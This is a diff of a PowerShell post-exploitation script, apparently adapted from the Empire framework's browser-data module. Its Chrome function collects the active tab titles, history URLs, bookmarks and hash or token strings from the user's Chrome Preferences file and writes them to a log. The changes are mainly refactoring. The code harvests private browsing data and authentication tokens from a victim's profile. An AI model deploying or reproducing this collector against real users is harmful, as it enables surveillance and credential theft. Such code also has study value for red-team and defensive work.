@@ -537,12 +537,12 @@ function CHROME {
         ## Dump Chrome Last Active Tab windowsTitle
         echo "`nActive Browser Tab" >> $LogFilePath\BrowserEnum.log
         echo "------------------" >> $LogFilePath\BrowserEnum.log
-        $check = Get-Process chrome -ErrorAction SilentlyContinue
-        If(-not($check)){
+        $checkTitle = Get-Process chrome -ErrorAction SilentlyContinue
+        If(-not($checkTitle)){
             echo "{requires chrome process running}`n" >> $LogFilePath\BrowserEnum.log
         }else{
-            $StoreData = Get-Process chrome | Select -ExpandProperty MainWindowTitle
-            $ParseData = $StoreData | where {$_ -ne ""}
+            $StoreData = Get-Process chrome|Select -ExpandProperty MainWindowTitle
+            $ParseData = $StoreData|where {$_ -ne ""}
             $MyPSObject = $ParseData -replace '- Google Chrome',''
             ## Write my PSobject to logfile
             echo "$MyPSObject`n" >> $LogFilePath\BrowserEnum.log
@@ -570,13 +570,13 @@ function CHROME {
         # Source: https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Get-BrowserData.ps1
         echo "Chrome History" >> $LogFilePath\BrowserEnum.log
         echo "--------------" >> $LogFilePath\BrowserEnum.log
-        $History_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
-        If(-not(Test-Path -Path $History_Path)){
+        If(-not(Test-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History")){
             echo "{Could not find any History}" >> $LogFilePath\BrowserEnum.log
         }else{
             $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
+            $History_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
             $Get_Values = Get-Content -Path "$History_Path"|Select-String -AllMatches $Regex |% {($_.Matches).Value} |Sort -Unique
-            $Get_Values | ForEach-Object {
+            $Get_Values|ForEach-Object {
                 $Key = $_
                 if ($Key -match $Search){
                     echo "$_" >> $LogFilePath\BrowserEnum.log
@@ -587,29 +587,27 @@ function CHROME {
         ## Retrieve Chrome bookmarks
         echo "`nChrome Bookmarks" >> $LogFilePath\BrowserEnum.log
         echo "----------------" >> $LogFilePath\BrowserEnum.log
-        $Bookmarks_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
-        If(-not(Test-Path -Path $Bookmarks_Path)) {
+        If(-not(Test-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks")) {
             echo "{Could not find any Bookmarks}" >> $LogFilePath\BrowserEnum.log
         }else{
-            $Json = Get-Content $Bookmarks_Path
+            $Json = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
             $Output = ConvertFrom-Json20($Json)
             $Jsonobject = $Output.roots.bookmark_bar.children
-            $Jsonobject.url |Sort -Unique | ForEach-Object {
+            $Jsonobject.url|Sort -Unique|ForEach-Object {
                 if ($_ -match $Search) {
                     echo "$_" >> $LogFilePath\BrowserEnum.log
                 }
             }
         }
 
-        ## Retrieve Chrome Cookies (hashs)
+        ## Retrieve Chrome (Tokens|Hashs)
         echo "`n`nChrome Hashs|Tokens" >> $LogFilePath\BrowserEnum.log
         echo "-------------------" >> $LogFilePath\BrowserEnum.log
-        $Cookie_Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
-        If(-not(Test-Path -Path $Cookie_Path)){
+        If(-not(Test-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences")){
             echo "{Could not find any Hashs|Tokens}" >> $LogFilePath\BrowserEnum.log
         }else{
-            $Preferencies_Path = get-content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
-            $Parse_String = $Preferencies_Path.split(",");$Find_MyHashes = $Parse_String|Select-String "hash","token"
+            $Preferencies_Path = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"
+            $Parse_String = $Preferencies_Path.split(",");$Find_MyHashes = $Parse_String|Select-String -pattern "hash","token"
             $BadChars = $Find_MyHashes -replace '"','' -replace '{','' -replace '\[','' -replace '}','' -replace '\]',''
             $Dump_Key_Hash = $BadChars|Select-String -pattern '[=]$' # Regex to match the last char '=' of the string.
             echo $Dump_Key_Hash >> $LogFilePath\BrowserEnum.log
